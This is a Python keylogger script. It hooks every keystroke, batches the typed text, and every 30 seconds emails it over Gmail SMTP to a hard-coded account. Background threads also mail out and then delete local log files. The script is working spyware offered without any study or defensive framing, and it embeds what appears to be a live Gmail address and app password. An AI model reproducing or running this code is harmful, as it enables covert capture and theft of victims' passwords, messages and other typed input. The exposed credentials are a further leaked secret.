import keyboard  # for keylogs

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os as o
import time
import threading
from threading import Timer
from datetime import datetime

EMAIL_ADDRESS = "jezus459@gmail.com"
EMAIL_PASSWORD = "qlrduwivghvzbmwr"
class Keylogger:
    def __init__(self):
        self.log = ""
        self.interval = 30
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

        thread1 = threading.Thread(target=self.info_sender, args=("log1.txt",))
        thread2 = threading.Thread(target=self.info_sender, args=("log2.txt",))
        thread3 = threading.Thread(target=self.info_sender, args=("log3.txt",))

        thread1.start()
        thread2.start()
        thread3.start()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def info_sender(self,filename):
        Time = 0
        while True:
            try:
                with open(filename, "rb") as attachment:
                    self.send_email_dane(attachment.read(), filename)
                    attachment.close()
                    o.remove(filename)
                    break
            except FileNotFoundError:
                time.sleep(10)
                Time = Time + 1
                if (Time == 10):
                    break

    def send(self,message):
        password = "qlrduwivghvzbmwr"
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(message['From'], password)
        msg = message.as_string()
        server.sendmail(message['From'], message['From'], msg)
        server.quit()

    def send_email_dane(self,dane, log):
        # Setting up MIME
        message = MIMEMultipart()
        message['From'] = "jezus459@gmail.com"
        message['Subject'] = log
        message.attach(MIMEText(f'{message["Subject"]} are located in this file: ', 'plain'))
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload(dane)
        encoders.encode_base64(payload)
        payload.add_header('Content-Decomposition', 'attachment', filename=log)
        message.attach(payload)

        self.send(message)
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def prepare_mail(self, message):

        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, email, password, message):

        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()

    def run(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

keylogger = Keylogger()
keylogger.run()
